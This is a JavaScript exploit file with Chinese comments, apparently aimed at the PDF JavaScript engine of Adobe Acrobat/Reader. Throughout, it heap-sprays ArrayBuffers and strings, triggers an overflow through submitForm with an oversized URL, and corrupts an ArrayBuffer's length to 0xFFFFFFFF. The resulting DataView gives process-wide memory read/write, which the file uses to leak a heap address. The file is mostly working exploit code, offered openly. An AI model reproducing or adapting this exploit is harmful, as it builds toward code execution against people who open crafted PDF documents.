console.show()

function gc() {
    new ArrayBuffer(3 * 1024 * 1024 * 100);
}

//相对URL缓冲区大小为0x600
var strRelUrlSize = 0x600;
//拼接URL缓冲区大小为0x800，基本URL长度为0x200，设置容纳拼接字符串的缓冲区大小为0x800
var strConUrlSize = 0x800;

//创建特定大小的TypedArray用于堆喷
function createArrayBuffer(blocksize) {
    //创建一个ArrayBuffer，该ArrayBuffer可用于与TypedBuffer共享同一片内存，ArrayBuffer代表原始的二进制数据，无法直接读写，并且一个ArrayBuffer对象包含0x10字节其他内容，进行堆喷填充时要减去头部对象大小
    //app.alert("heap spary");
    var arr = new ArrayBuffer(blocksize - 0x10);
    //使用Uint8Array类型的TypedArray与ArrayBuffer共享同一片内存，对ArrayBuffer进行读写
    var u8 = new Uint8Array(arr);
    for (var i = 0; i < arr.byteLength; i++) {
        u8[i] = 0x41;
    }
    return arr;
}

//再次进行堆喷，进行相对URL字符串大小的堆喷
var arrB = new Array(0xE0);
//避免修改ArrayBuffer除byteLength之外的字段
var sprayStr = unescape('%uFFFF%uFFFF%uFFFF%uFFFF%u0000') + unescape('%uFFFF').repeat((strRelUrlSize / 2) - 1 - 5);
for (var i = 0; i < arrB.length; i++) {
    arrB[i] = sprayStr.substr(0, (strRelUrlSize / 2) - 1).toUpperCase();
}

for (var i = 0x11; i < arrB.length; i += 10) {
    arrB[i] = null;
    arrB[i] = undefined;
}

//声明一个数组，用来容纳堆喷的对象
var arrA = new Array(0x130);
for (var i = 0; i < arrA.length; i++) {
    //对数组中元素进行分配ArrayBuffer对象，进行拼接URL字符串大小的堆喷
    arrA[i] = createArrayBuffer(strConUrlSize);
}
//释放堆喷数组中的元素对象
for (var i = 0x11; i < arrA.length; i += 10) {
    arrA[i] = null;
    arrA[i] = undefined;
}

//触发gc，制造内存空洞
gc();

//触发漏洞，进行内存溢出
app.alert("ready to trigger");

try {
    //拷贝时从偏移0x2开始拷贝
    this.submitForm('a'.repeat(strRelUrlSize - 1));
} catch (err) { }

for (var i = 0; i < arrA.length; i++) {
    if (arrA[i] != null && arrA[i].byteLength == 0xFFFF) {
        app.alert("find corrupt ArrayBuffer1")
        var temp = new DataView(arrA[i]);
        //设置下一个ArrayBuffer的byteLength为0xFFFFFFFF，当前ArrayBuffer中内容大小为0x7F0，下一个chunk头部大小为0x8，下一个ArrayBuffer头部字段偏移0x4为byteLength字段
        temp.setInt32(0x7F0 + 0x8 + 0x4, 0xFFFFFFFF, true);
    }
}

//查找byteLength被修改为0xFFFFFFFF的Array Buffer，然后设置DataView，这样就可以通过DataView读写偏移范围为0xFFFFFFFF内的数据，即全进程范围的内存读写
for (var i = 0; i < arrA.length; i++) {
    if (arrA[i] != null && arrA[i].byteLength == -1) {
        var rw = new DataView(arrA[i]);
        corruptArrayBuffer = arrA[i];
        app.alert("find corrupt ArrayBuffer2");
    }
}

if (rw) {
    curChunkBlockOffset = rw.getUint8(0xFFFFFFED, true);
    BitMapBufOffset = curChunkBlockOffset * (strConUrlSize + 8) + 0x18
    for (var i = 0; i < 0x30; i += 4) {
        BitMapBufOffset += 4;
        signature = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
        if (signature == 0xF0E0D0C0) {
            BitMapBufOffset -= 0xC;
            BitMapBuf = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
            break;
        }
    }

    if (BitMapBuf) {
        app.alert(BitMapBuf);
    }
}